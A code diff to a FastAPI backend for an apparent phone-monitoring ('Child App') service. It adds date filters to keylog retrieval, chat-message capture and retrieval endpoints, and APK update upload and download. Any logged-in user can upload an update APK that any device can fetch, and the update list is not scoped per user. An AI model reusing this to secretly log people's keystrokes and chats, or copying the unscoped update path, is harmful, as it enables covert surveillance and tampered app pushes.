@@ -173,14 +173,29 @@ def read_locations_for_user(
 
 @router.get("/users/me/keylogs/", response_model=List[schemas.Keylog])
 def read_keylogs_for_user(
-    device_id: int = None, skip: int = 0, limit: int = 1000, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+    device_id: int = None, skip: int = 0, limit: int = 1000,
+    start_date: int = None, end_date: int = None,
+    db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
 ):
     if device_id:
         devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
         if not any(d.id == device_id for d in devices):
             raise HTTPException(status_code=403, detail="Device not owned by user")
-        return crud.get_keylogs_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
-    return crud.get_keylogs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit)
+        return crud.get_keylogs_by_device(db=db, device_id=device_id, skip=skip, limit=limit, start_date=start_date, end_date=end_date)
+    return crud.get_keylogs_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit, start_date=start_date, end_date=end_date)
+
+@router.get("/users/me/chat_messages/", response_model=List[schemas.ChatMessage])
+def read_chat_messages_for_user(
+    device_id: int = None, skip: int = 0, limit: int = 50000,
+    start_date: int = None, end_date: int = None, package_name: str = None,
+    db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)
+):
+    if device_id:
+        devices = crud.get_devices_by_user(db=db, user_id=current_user.id)
+        if not any(d.id == device_id for d in devices):
+            raise HTTPException(status_code=403, detail="Device not owned by user")
+        return crud.get_chat_messages_by_device(db=db, device_id=device_id, skip=skip, limit=limit, start_date=start_date, end_date=end_date, package_name=package_name)
+    return crud.get_chat_messages_by_user(db=db, user_id=current_user.id, skip=skip, limit=limit, start_date=start_date, end_date=end_date, package_name=package_name)
 
 # Device Telemetry Endpoints (for Child App)
 @router.post("/devices/me/call_logs/", response_model=schemas.CallLog)
@@ -316,6 +331,15 @@ def create_keylog_for_device(
     keylog.device_id = current_device.id
     return crud.create_user_keylog(db=db, keylog=keylog, user_id=current_device.owner_id)
 
+@router.post("/devices/me/chat_messages/", response_model=schemas.ChatMessage)
+def create_chat_message_for_device(
+    chat_message: schemas.ChatMessageCreate,
+    db: Session = Depends(get_db),
+    current_device: models.Device = Depends(get_current_device)
+):
+    chat_message.device_id = current_device.id
+    return crud.create_chat_message(db=db, chat_message=chat_message, user_id=current_device.owner_id)
+
 @router.post("/commands", response_model=schemas.CommandResponse)
 def enqueue_command(
     cmd_req: schemas.CommandCreateRequest,
@@ -432,3 +456,48 @@ def get_latest_live_audio(
             "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
         }
     )
+
+@router.post("/app-update/upload", response_model=schemas.AppUpdateUploadResponse)
+async def upload_app_update(
+    file: UploadFile = File(...),
+    version_name: str = Form(...),
+    version_code: int = Form(...),
+    db: Session = Depends(get_db),
+    current_user: models.User = Depends(get_current_user)
+):
+    data = await file.read()
+    s3_key = f"updates/app_v{version_code}.apk"
+    if not r2_service.upload_file(s3_key, data, file.content_type or "application/vnd.android.package-archive"):
+        raise HTTPException(status_code=503, detail="R2 upload failed")
+    update = models.AppUpdate(
+        version_name=version_name,
+        version_code=version_code,
+        s3_key=s3_key,
+        file_size=len(data),
+        uploaded_by=current_user.id
+    )
+    db.add(update)
+    db.commit()
+    db.refresh(update)
+    return update
+
+@router.get("/app-updates", response_model=List[schemas.AppUpdateUploadResponse])
+def list_app_updates(
+    db: Session = Depends(get_db),
+    current_user: models.User = Depends(get_current_user)
+):
+    return db.query(models.AppUpdate).order_by(models.AppUpdate.created_at.desc()).all()
+
+@router.get("/app-update/download", response_model=schemas.AppUpdateDownloadResponse)
+def get_update_download(
+    version_code: int,
+    db: Session = Depends(get_db),
+    current_device: models.Device = Depends(security.verify_device_token)
+):
+    update = db.query(models.AppUpdate).filter(models.AppUpdate.version_code == version_code).first()
+    if not update:
+        raise HTTPException(status_code=404, detail="Update not found")
+    url = r2_service.generate_presigned_get(update.s3_key)
+    if not url:
+        raise HTTPException(status_code=503, detail="R2 presigned URL failed")
+    return {"download_url": url}
